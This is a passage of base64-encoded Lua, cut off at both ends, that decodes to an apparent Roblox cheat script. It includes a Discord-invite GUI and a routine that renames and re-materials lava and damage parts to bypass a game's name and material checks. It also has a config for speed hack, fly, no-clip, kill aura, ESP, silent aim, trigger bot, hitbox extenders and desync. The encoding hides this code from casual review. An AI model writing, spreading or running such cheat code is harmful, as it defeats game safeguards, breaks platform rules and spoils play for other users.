b2xkCiAgICAgICAgRGlzY29yZEJ0bi5UZXh0U2l6ZSA9IDEyCiAgICAgICAgRGlzY29yZEJ0bi5QYXJlbnQgPSBGcmFtZQogICAgICAgIGxvY2FsIERDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KSBEQ29ybmVyLlBhcmVudCA9IERpc2NvcmRCdG4KICAgICAgICAKICAgICAgICBEaXNjb3JkQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBzZXRjbGlwYm9hcmQgdGhlbiBzZXRjbGlwYm9hcmQoImh0dHBzOi8vZGlzY29yZC5nZy9VM3B2QVBOd0RYIikgZW5kCiAgICAgICAgICAgIERpc2NvcmRCdG4uVGV4dCA9ICLinIUgQ09QSUVEISIKICAgICAgICAgICAgdGFzay53YWl0KDEuNSkKICAgICAgICAgICAgRGlzY29yZEJ0bi5UZXh0ID0gIvCflJcgSm9pbiBEaXNjb3JkIgogICAgICAgIGVuZCkKICAgICAgICAK" .. "ICAgICAgICAtLSBDbG9zZSBCdXR0b24gKFgpCiAgICAgICAgbG9jYWwgQ2xvc2VCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIENsb3NlQnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMjUsIDAsIDI1KQogICAgICAgIENsb3NlQnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0zNSwgMCwgMTApCiAgICAgICAgQ2xvc2VCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDYwLCA2MCwgNjUpCiAgICAgICAgQ2xvc2VCdG4uVGV4dCA9ICLinJUiCiAgICAgICAgQ2xvc2VCdG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICAgICAgQ2xvc2VCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgQ2xvc2VCdG4uVGV4dFNpemUgPSAxMgogICAgICAgIENsb3NlQnRuLlBhcmVudCA9IEZyYW1lCiAgICAgICAgbG9jYWwgQ0Nvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBDQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpIENDb3JuZXIuUGFyZW50ID0gQ2xvc2VCdG4KICAgICAgICAKICAgICAgICBDbG9zZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgTWFpbnRlbmFuY2VHdWk6RGVzdHJveSgpCiAgICAgICAgZW5kKQogICAgZW5kKQplbmQKCmxvY2FsIFNob3dLZXlTeXN0ZW0gLS0gRm9yd2FyZCBkZWNsYXJhdGlvbgoKLS0gPT09IEVYVEVSTkFMIEhFTFBFUiBGVU5DVElPTlMgKFRvIHJlZHVjZSBTdGFydENoZWF0IGxvY2FscykgPT09Cgpsb2NhbCBmdW5jdGlvbiBSYW5kb21OdW1iZXJSYW5nZShhKQogICAgcmV0dXJuIG1hdGgucmFuZG9tKC1hICogMTAwLCBhICogMTAwKSAvIDEwMAplbmQKCmxvY2FsIGZ1bmN0aW9uIEFwcGx5RGVzY3JpcHRpb25DdXN0b20oaHVtYW5vaWQsIGRlc2NyaXB0aW9uKQogICAgbG9jYWwgY2hhcmFjdGVyID0gaHVtYW5vaWQuUGFyZW50CiAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgCiAgICAtLSAxLiBCb2R5IENvbG9ycwogICAgbG9jYWwgYm9keUNvbG9ycyA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkJvZHlDb2xvcnMiKQogICAgaWYgbm90IGJvZHlDb2xvcnMgdGhlbgogICAgICAgIGJvZHlDb2xvcnMgPSBJbnN0YW5jZS5uZXcoIkJvZHlDb2xvcnMiKQogICAgICAgIGJvZHlDb2xvcnMuTmFtZSA9ICJCb2R5IENvbG9ycyIKICAgICAgICBib2R5Q29sb3JzLlBhcmVudCA9IGNoYXJhY3RlcgogICAgZW5kCiAgICBib2R5Q29sb3JzLkhlYWRDb2xvcjMgPSBkZXNjcmlwdGlvbi5IZWFkQ29sb3IKICAgIGJvZHlDb2xvcnMuVG9yc29Db2xvcjMgPSBkZXNjcmlwdGlvbi5Ub3Jzb0NvbG9yCiAgICBib2R5Q29sb3JzLkxlZnRBcm1Db2xvcjMgPSBkZXNjcmlwdGlvbi5MZWZ0QXJtQ29sb3IKICAgIGJvZHlDb2xvcnMuUmlnaHRBcm1Db2xvcjMgPSBkZXNjcmlwdGlvbi5SaWdodEFybUNvbG9yCiAgICBib2R5Q29sb3JzLkxlZnRMZWdDb2xvcjMgPSBkZXNjcmlwdGlvbi5MZWZ0TGVnQ29sb3IKICAgIGJvZHlDb2xvcnMuUmlnaHRMZWdDb2xvcjMgPSBkZXNjcmlwdGlvbi5SaWdodExlZ0NvbG9yCiAgICAKICAgIC0tIDIuIENsb3RoaW5nCiAgICBsb2NhbCBmdW5jdGlvbiB1cGRhdGVDbG90aGluZyhjbGFzc05hbWUsIHByb3BOYW1lLCBpZCkKICAgICAgICBpZiBpZCBhbmQgaWQgPiAwIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBnYW1lOkdldE9iamVjdHMoInJieGFzc2V0aWQ6Ly8iIC4uIGlkKSBlbmQpCiAgICAgICAgICAgICAgICBpZiBzdWNjZXNzIGFuZCByZXN1bHQgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMocmVzdWx0KSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBvYmo6SXNBKGNsYXNzTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaXRlbSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoY2xhc3NOYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGl0ZW0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0gPSBJbnN0YW5jZS5uZXcoY2xhc3NOYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW0uUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1bcHJvcE5hbWVdID0gb2JqW3Byb3BOYW1lXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVsc2UKICAgICAgICAgICAgbG9jYWwgaXRlbSA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoY2xhc3NOYW1lKQogICAgICAgICAgICBpZiBpdGVtIHRoZW4gaXRlbTpEZXN0cm95KCkgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgdXBkYXRlQ2xvdGhpbmcoIlNoaXJ0IiwgIlNoaXJ0VGVtcGxhdGUiLCBkZXNjcmlwdGlvbi5TaGlydCkKICAgIHVwZGF0ZUNsb3RoaW5nKCJQYW50cyIsICJQYW50c1RlbXBsYXRlIiwgZGVzY3JpcHRpb24uUGFudHMpCiAgICB1cGRhdGVDbG90aGluZygiU2hpcnRHcmFwaGljIiwgIkdyYXBoaWMiLCBkZXNjcmlwdGlvbi5HcmFwaGljVFNoaXJ0KQogICAgCiAgICAtLSAzLiBGYWNlCiAgICBsb2NhbCBoZWFkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgIGlmIGhlYWQgdGhlbgogICAgICAgIGxvY2FsIGZhY2UgPSBoZWFkOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiRGVjYWwiKQogICAgICAgIGlmIGRlc2NyaXB0aW9uLkZhY2UgYW5kIGRlc2NyaXB0aW9uLkZhY2UgPiAwIHRoZW4KICAgICAgICAgICAgaWYgbm90IGZhY2UgdGhlbgogICAgICAgICAgICAgICAgZmFjZSA9IEluc3RhbmNlLm5ldygiRGVjYWwiKQogICAgICAgICAgICAgICAgZmFjZS5OYW1lID0gImZhY2UiCiAgICAgICAgICAgICAgICBmYWNlLlBhcmVudCA9IGhlYWQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGZhY2UuVGV4dHVyZSA9ICJyYnhhc3NldGlkOi8vIiAuLiBkZXNjcmlwdGlvbi5GYWNlCiAgICAgICAgZWxzZQogICAgICAgICAgICBpZiBmYWNlIHRoZW4gZmFjZTpEZXN0cm95KCkgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgLS0gNC4gQWNjZXNzb3JpZXMKICAgIGZvciBfLCB2IGluIHBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHY6SXNBKCJBY2Nlc3NvcnkiKSB0aGVuIHY6RGVzdHJveSgpIGVuZAogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGxvYWRBY2Nlc3NvcmllcyhpZHMpCiAgICAgICAgaWYgbm90IGlkcyBvciBpZHMgPT0gIiIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgZm9yIGlkIGluIHN0cmluZy5nbWF0Y2goaWRzLCAiKFteLF0rKSIpIGRvCiAgICAgICAgICAgIGxvY2FsIGFzc2V0SWQgPSB0b251bWJlcihpZCkKICAgICAgICAgICAgaWYgYXNzZXRJZCB0aGVuCiAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiBnYW1lOkdldE9iamVjdHMoInJieGFzc2V0aWQ6Ly8iIC4uIGFzc2V0SWQpIGVuZCkKICAgICAgICAgICAgICAgICAgICBpZiBzdWNjZXNzIGFuZCByZXN1bHQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKHJlc3VsdCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9iajpJc0EoIkFjY2Vzc29yeSIpIHRoZW4gb2JqLlBhcmVudCA9IGNoYXJhY3RlciBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGxvYWRBY2Nlc3NvcmllcyhkZXNjcmlwdGlvbi5IYXRBY2Nlc3NvcnkpCiAgICBsb2FkQWNjZXNzb3JpZXMoZGVzY3JpcHRpb24uSGFpckFjY2Vzc29yeSkKICAgIGxvYWRBY2Nlc3NvcmllcyhkZXNjcmlwdGlvbi5GYWNlQWNjZXNzb3J5KQogICAgbG9hZEFjY2Vzc29yaWVzKGRlc2NyaXB0aW9uLk5lY2tBY2Nlc3NvcnkpCiAgICBsb2FkQWNjZXNzb3JpZXMoZGVzY3JpcHRpb24uU2hvdWxkZXJzQWNjZXNzb3J5KQogICAgbG9hZEFjY2Vzc29yaWVzKGRlc2NyaXB0aW9uLkZyb250QWNjZXNzb3J5KQogICAgbG9hZEFjY2Vzc29yaWVzKGRlc2NyaXB0aW9uLkJhY2tBY2Nlc3NvcnkpCiAgICBsb2FkQWNjZXNzb3JpZXMoZGVzY3JpcHRpb24uV2Fpc3RBY2Nlc3NvcnkpCiAgICAKICAgIC0tIDUuIEJvZHkgUGFydHMgKFI2ICYgUjE1KQogICAgZm9yIF8sIHYgaW4gcGFpcnMoY2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdjpJc0EoIkNoYXJhY3Rlck1lc2giKSB0aGVuIHY6RGVzdHJveSgpIGVuZAogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGxvYWRCb2R5UGFydHMoaWQpCiAgICAgICAgaWYgbm90IGlkIG9yIGlkID09IDAgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MsIHJlc3VsdCA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIGdhbWU6R2V0T2JqZWN0cygicmJ4YXNzZXRpZDovLyIgLi4gaWQpIGVuZCkKICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgcmVzdWx0IHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMocmVzdWx0KSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHJlY3Vyc2UoaXRlbSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXRlbTpJc0EoIkNoYXJhY3Rlck1lc2giKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpdGVtLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgaXRlbTpJc0EoIk1lc2hQYXJ0IikgYW5kIGh1bWFub2lkLlJpZ1R5cGUgPT0gRW51bS5IdW1hbm9pZFJpZ1R5cGUuUjE1IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJQYXJ0ID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKGl0ZW0uTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoYXJQYXJ0IGFuZCBjaGFyUGFydDpJc0EoIk1lc2hQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgY2hhclBhcnQuTWVzaElkID0gaXRlbS5NZXNoSWQgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgY2hhclBhcnQuVGV4dHVyZUlEID0gaXRlbS5UZXh0dXJlSUQgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgY2hhclBhcnQuU2l6ZSA9IGl0ZW0uU2l6ZSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBjaGlsZCBpbiBwYWlycyhpdGVtOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWN1cnNlKGNoaWxkKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICByZWN1cnNlKG9iaikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgbG9hZEJvZHlQYXJ0cyhkZXNjcmlwdGlvbi5IZWFkKQogICAgbG9hZEJvZHlQYXJ0cyhkZXNjcmlwdGlvbi5Ub3JzbykKICAgIGxvYWRCb2R5UGFydHMoZGVzY3JpcHRpb24uTGVmdEFybSkKICAgIGxvYWRCb2R5UGFydHMoZGVzY3JpcHRpb24uUmlnaHRBcm0pCiAgICBsb2FkQm9keVBhcnRzKGRlc2NyaXB0aW9uLkxlZnRMZWcpCiAgICBsb2FkQm9keVBhcnRzKGRlc2NyaXB0aW9uLlJpZ2h0TGVnKQogICAgCiAgICAtLSA2LiBTY2FsZXMKICAgIGxvY2FsIGZ1bmN0aW9uIHVwZGF0ZVNjYWxlKG5hbWUsIHZhbCkKICAgICAgICBpZiBub3QgdmFsIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGxvY2FsIHZhbE9iaiA9IGh1bWFub2lkOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICAgICAgaWYgbm90IHZhbE9iaiB0aGVuCiAgICAgICAgICAgIHZhbE9iaiA9IEluc3RhbmNlLm5ldygiTnVtYmVyVmFsdWUiKQogICAgICAgICAgICB2YWxPYmouTmFtZSA9IG5hbWUKICAgICAgICAgICAgdmFsT2JqLlBhcmVudCA9IGh1bWFub2lkCiAgICAgICAgZW5kCiAgICAgICAgdmFsT2JqLlZhbHVlID0gdmFsCiAgICBlbmQKICAgIAogICAgdXBkYXRlU2NhbGUoIkJvZHlIZWlnaHRTY2FsZSIsIGRlc2NyaXB0aW9uLkhlaWdodFNjYWxlKQogICAgdXBkYXRlU2NhbGUoIkJvZHlXaWR0aFNjYWxlIiwgZGVzY3JpcHRpb24uV2lkdGhTY2FsZSkKICAgIHVwZGF0ZVNjYWxlKCJCb2R5RGVwdGhTY2FsZSIsIGRlc2NyaXB0aW9uLkRlcHRoU2NhbGUpCiAgICB1cGRhdGVTY2FsZSgiSGVhZFNjYWxlIiwgZGVzY3JpcHRpb24uSGVhZFNjYWxlKQogICAgdXBkYXRlU2NhbGUoIkJvZHlQcm9wb3J0aW9uU2NhbGUiLCBkZXNjcmlwdGlvbi5Qcm9wb3J0aW9uU2NhbGUpCiAgICB1cGRhdGVTY2FsZSgiQm9keVR5cGVTY2FsZSIsIGRlc2NyaXB0aW9uLkJvZHlUeXBlU2NhbGUpCmVuZAoKbG9jYWwgZnVuY3Rpb24gZGlzYWJsZURhbWFnZUJsb2NrKHBhcnQpCiAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgbG9jYWwgbmFtZSA9IHBhcnQuTmFtZTpsb3dlcigpCiAgICAgICAgbG9jYWwgcGFyZW50TmFtZSA9IHBhcnQuUGFyZW50IGFuZCBwYXJ0LlBhcmVudC5OYW1lOmxvd2VyKCkgb3IgIiIKICAgICAgICBsb2NhbCBzaG91bGREaXNhYmxlID0gZmFsc2UKICAgICAgICAKICAgICAgICAtLSBEZXRlY3QgRGFtYWdlIFpvbmVzIChFeHBhbmRlZCBLZXl3b3JkcyArIFBhcmVudCBDaGVjaykKICAgICAgICBsb2NhbCBkYW1hZ2VLZXl3b3JkcyA9IHsibGF2YSIsICJtYWdtYSIsICJhY2lkIiwgIndhdGVyIiwgImRhbWFnZSIsICJidXJuIiwgImtpbGwiLCAiZGVhdGgiLCAiaHVydCIsICJ2b2lkIiwgInNwaWtlIiwgImZpcmUiLCAiZmxhbWUiLCAidHJhcCIsICJsYXNlciJ9CiAgICAgICAgZm9yIF8sIGt3IGluIHBhaXJzKGRhbWFnZUtleXdvcmRzKSBkbwogICAgICAgICAgICBpZiAoc3RyaW5nLmZpbmQobmFtZSwga3cpIG9yIHN0cmluZy5maW5kKHBhcmVudE5hbWUsIGt3KSkgYW5kIG5vdCBzdHJpbmcuZmluZChuYW1lLCAic2FmZSIpIGFuZCBub3Qgc3RyaW5nLmZpbmQobmFtZSwgInNwYXduIikgdGhlbgogICAgICAgICAgICAgICAgc2hvdWxkRGlzYWJsZSA9IHRydWUKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIHBhcnQuTWF0ZXJpYWwgPT0gRW51bS5NYXRlcmlhbC5DcmFja2VkTGF2YSBvciBwYXJ0Lk1hdGVyaWFsID09IEVudW0uTWF0ZXJpYWwuV2F0ZXIgdGhlbiBzaG91bGREaXNhYmxlID0gdHJ1ZSBlbmQKICAgICAgICAKICAgICAgICAtLSBDaGVjayBDaGlsZHJlbiAoVGV4dHVyZXMvRGVjYWxzKSBhcyByZXF1ZXN0ZWQgYnkgdXNlcgogICAgICAgIGlmIG5vdCBzaG91bGREaXNhYmxlIHRoZW4KICAgICAgICAgICAgZm9yIF8sIGNoaWxkIGluIHBhaXJzKHBhcnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiVGV4dHVyZSIpIG9yIGNoaWxkOklzQSgiRGVjYWwiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGV4TmFtZSA9IGNoaWxkLk5hbWU6bG93ZXIoKQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBrdyBpbiBwYWlycyhkYW1hZ2VLZXl3b3JkcykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgc3RyaW5nLmZpbmQodGV4TmFtZSwga3cpIHRoZW4gc2hvdWxkRGlzYWJsZSA9IHRydWUgYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHNob3VsZERpc2FibGUgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgaWYgc2hvdWxkRGlzYWJsZSB0aGVuCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHBhcnQuQ2FuVG91Y2ggPSBmYWxzZQogICAgICAgICAgICAgICAgcGFydC5NYXRlcmlhbCA9IEVudW0uTWF0ZXJpYWwuUGxhc3RpYyAtLSBCeXBhc3MgRmxvb3JNYXRlcmlhbCBjaGVja3MKICAgICAgICAgICAgICAgIHBhcnQuTmFtZSA9ICJTYWZlWm9uZV9CeXBhc3NlZCIgLS0gQnlwYXNzIE5hbWUgY2hlY2tzCiAgICAgICAgICAgICAgICBpZiBwYXJ0OkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG91Y2hJbnRlcmVzdCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBwYXJ0OkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG91Y2hJbnRlcmVzdCIpOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCi0tID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQotLSAgICAgICAgICAgICAgICAgICAgICAgICAgTUFJTiBDSEVBVCBGVU5DVElPTgotLSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCmxvY2FsIGZ1bmN0aW9uIFN0YXJ0Q2hlYXQoa2V5RHVyYXRpb24sIGtleVN0cmluZywgaXNXaGl0ZWxpc3RlZCkKICAgIC0tID09PSBDT05GSUdVUkFUSU9OID09PQogICAgbG9jYWwgQ29uZmlnID0gewogICAgICAgIElzUnVubmluZyA9IHRydWUsCiAgICAgICAgSXNXaGl0ZWxpc3RlZCA9IGlzV2hpdGVsaXN0ZWQsCiAgICAgICAgSXNBZG1pbiA9IGZhbHNlLAogICAgICAgIC0tIEFudGkgQnVkZGhhIC8gRGVzeW5jCiAgICAgICAgTWFzdGVyU3dpdGNoID0gdHJ1ZSwKICAgICAgICAKICAgICAgICAtLSBTZXR0aW5ncyAvIE1vZHMKICAgICAgICBTcGVlZEtleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLCAtLSBBdHRlbnRpb246IFYgZXN0IGF1c3NpIHVuZSBtYWNybyBrZXkKICAgICAgICBTdGFuZGFyZEZseUtleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLAogICAgICAgIAogICAgICAgIFNwZWVkSGFjayA9IGZhbHNlLAogICAgICAgIFdhbGtTcGVlZFZhbHVlID0gMCwKICAgICAgICBKdW1wUG93ZXJWYWx1ZSA9IDAsCiAgICAgICAgCiAgICAgICAgU3RhbmRhcmRGbHkgPSBmYWxzZSwKICAgICAgICBGbHlTcGVlZFZhbHVlID0gMCwgLS0gTWF4IDc1CiAgICAgICAgCiAgICAgICAgSW5mSnVtcCA9IGZhbHNlLAogICAgICAgIAogICAgICAgIC0tIFBsYXllcnMgVGFiIChBaW0gTG9jayAmIEtpbGwgQXVyYSAmIE5vQ2xpcCkKICAgICAgICBMb2NrS2V5ID0gRW51bS5LZXlDb2RlLlVua25vd24sCiAgICAgICAgRWFzeUxvY2sgPSBmYWxzZSwKICAgICAgICBGb2xsb3dEaXN0YW5jZSA9IDAsCiAgICAgICAgVGFyZ2V0TmFtZSA9ICJOb25lIiwKICAgICAgICAKICAgICAgICBLaWxsQXVyYSA9IGZhbHNlLAogICAgICAgIEF1cmFSYW5nZSA9IDE1MDAsCiAgICAgICAgVGVhbUNoZWNrID0gZmFsc2UsCiAgICAgICAgCiAgICAgICAgTm9DbGlwID0gZmFsc2UsCiAgICAgICAgQW50aUxhdmEgPSBmYWxzZSwKICAgICAgICBXYWxrV2F0ZXIgPSBmYWxzZSwKICAgICAgICBBbnRpU3R1biA9IGZhbHNlLAogICAgICAgIAogICAgICAgIEluc3RhbnRSZXNwYXduID0gZmFsc2UsCiAgICAgICAgQWlyRmxhc2hTdGVwID0gZmFsc2UsCiAgICAgICAgQWlyRmxhc2hTdGVwUmFuZ2UgPSAyMDAsCiAgICAgICAgCiAgICAgICAgLS0gT3JiaXQgUGxheWVyCiAgICAgICAgT3JiaXRQbGF5ZXIgPSBmYWxzZSwKICAgICAgICBPcmJpdFBsYXllcktleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLAogICAgICAgIE9yYml0UGxheWVyVGFyZ2V0ID0gIiIsCiAgICAgICAgCiAgICAgICAgRmFrZUxhZyA9IGZhbHNlLAogICAgICAgIEZha2VMYWdLZXkgPSBFbnVtLktleUNvZGUuVW5rbm93biwKICAgICAgICAKICAgICAgICAtLSBWaXN1YWxzIChFU1ApCiAgICAgICAgRVNQQm94ID0gZmFsc2UsCiAgICAgICAgRVNQTmFtZSA9IGZhbHNlLAogICAgICAgIEVTUEx2bCA9IGZhbHNlLAogICAgICAgIEVTUEhQID0gZmFsc2UsCiAgICAgICAgRVNQQ2hhbXMgPSBmYWxzZSwKICAgICAgICBFU1BEb3QgPSBmYWxzZSwKICAgICAgICBFU1BOUEMgPSBmYWxzZSwKICAgICAgICBFU1BUcmFjZXJzID0gZmFsc2UsCiAgICAgICAgRVNQRnJ1aXQgPSBmYWxzZSwKICAgICAgICBQb3RhdG9HcmFwaGljcyA9IGZhbHNlLAogICAgICAgIEZPVlZhbHVlID0gNzAsCiAgICAgICAgUmVtb3ZlRm9nID0gZmFsc2UsCiAgICAgICAgTm9BbmltID0gZmFsc2UsCiAgICAgICAgRVNQU2l6ZSA9IDEwLAogICAgICAgIEVTUENvbG9yUiA9IDI1NSwKICAgICAgICBFU1BDb2xvckcgPSAyNTUsCiAgICAgICAgRVNQQ29sb3JCID0gMjU1LAogICAgICAgIEN1c3RvbUN1cnNvcklkID0gIiIsCiAgICAgICAgQ3Vyc29yTmFtZSA9ICIiLAogICAgICAgIEluc3BlY3Rvck5hbWUgPSAiIiwKICAgICAgICBTaG93TW9uZXkgPSBmYWxzZSwKICAgICAgICBTaG93RnJhZ21lbnRzID0gZmFsc2UsCiAgICAgICAgU2hvd0JvdW50eSA9IGZhbHNlLAogICAgICAgIAogICAgICAgIC0tIFNlcnZlciBTdGF0cwogICAgICAgIFNob3dGUFMgPSBmYWxzZSwKICAgICAgICBTaG93UGluZyA9IGZhbHNlLAogICAgICAgIFNob3dVcHRpbWUgPSBmYWxzZSwKICAgICAgICBTaG93U2VydmVyID0gZmFsc2UsCiAgICAgICAgCiAgICAgICAgLS0gSGl0Ym94IFByZXNldAogICAgICAgIEhpdGJveFByZXNldCA9IGZhbHNlLAogICAgICAgIFRvcnNvU2l6ZSA9IDAsCiAgICAgICAgCiAgICAgICAgLS0gVHJpZ2dlciBCb3QgJiBTaWxlbnQgQWltCiAgICAgICAgVHJpZ2dlckJvdCA9IGZhbHNlLAogICAgICAgIFRyaWdnZXJEaXN0YW5jZSA9IDAsCiAgICAgICAgCiAgICAgICAgU2lsZW50QWltID0gZmFsc2UsCiAgICAgICAgU2lsZW50Rk9WID0gMCwKICAgICAgICBTaWxlbnRSYW5nZSA9IDAsCiAgICAgICAgU2hvd0ZPViA9IGZhbHNlLAogICAgICAgIFNpbGVudEFpbUtleSA9IEVudW0uS2V5Q29kZS5Vbmtub3duLCAtLSBUb3VjaGUgZGUgTG9jawogICAgICAgIAogICAgICAgIC0tIEhpdGJveCBFeHRlbmRlcgogICAgICAgIEhpdGJveEV4cGFuZGVyID0gZmFsc2UsCiAgICAgICAgSGl0Ym94U2l6ZSA9IDIsCiAgICAgICAgSGl0Ym94VHJhbnNwYXJlbmN5ID0gMC43LAogICAgICAgIEhpdGJveFRyYW5zcGFyZW5jeSA9IDAsCiAgICAgICAgSGl0Ym94TW9kZUFsbCA9IHRydWUsCiAgICAgICAgSGl0Ym94VGFyZ2V0VXNlciA9ICIiLAogICAgICAgIAogICAgICAgIC0tIFNlbGYgUmVhY2gKICAgICAgICBSZWFjaCA9IGZhbHNlLAogICAgICAgIFJlYWNoU2l6ZSA9IDIsCiAgICAgICAgUmVhY2hUcmFuc3BhcmVuY3kgPSAwLjUsCiAgICAgICAgCiAgICAgICAgLS0gV2VhcG9uIEV4dGVuZGVyCiAgICAgICAgV2VhcG9uRXh0Z